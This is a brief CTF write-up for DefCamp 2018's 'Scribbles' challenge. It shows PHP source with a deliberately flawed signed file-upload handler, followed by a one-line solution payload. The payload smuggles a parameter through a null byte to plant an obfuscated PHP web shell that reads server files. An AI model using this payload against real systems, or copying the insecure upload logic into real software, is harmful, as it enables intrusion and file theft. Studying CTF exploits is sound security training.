# Challenge 
index.php:
```php
<?php

require('config.php');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  highlight_file(__FILE__);
  exit;
}
if (empty($_GET['action'])) {

  $data = $_POST['data'];
  $name = uniqid();

  $payload = "data=$data&name=$name";
  $post = http_build_query([
    'signature' => hash_hmac('md5', $payload, FLAG),
    'payload' => $payload,
  ]);

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1" . $_SERVER['REQUEST_URI'] . "?action=log");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

  echo curl_exec($ch);

} else {

  if (hash_hmac('md5', $_POST['payload'], FLAG) !== $_POST['signature']) {
    echo 'FAIL';
    exit;
  }

  parse_str($_POST['payload'], $payload);

  $target = 'files/' . time() . '.' . substr($payload['name'], -20);
  $contents = $payload['data'];
  $decoded = base64_decode($contents);
  $ext = 'raw';

  if (isset($payload['ext'])) {
    $ext = (
      ( $payload['ext'] == 'j' ) ? 'jpg' :
      ( $payload['ext'] == 'p' ) ? 'php' :
      ( $payload['ext'] == 'r' ) ? 'raw' : 'file'
    );
  }

  if ($decoded !== '') {
    $contents = $decoded;
    $target .= '.' . $ext;
  }

  if (strlen($contents) > 37) {
    echo 'FAIL';
    exit;
  }

  file_put_contents($target, $contents);

  echo 'OK';
}
```

config.php:
```php
<?php

set_time_limit(10);
define('FLAG', 'DCTF{7b39c8fcaef42b2f72d1f7d6f0686802bd9282f289f125281fd92c67572dd390}');

// added afterwards, not part of the challenge and keeps crashing apache because of a scenario
$_SERVER['REQUEST_URI'] = '/';
```
# Solution
getshell：
```
data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00
```


# Refference
+ DefCamp CTF Finals 2018 
+ https://github.com/w181496/CTF/tree/master/dctf2018-final/Scribbles
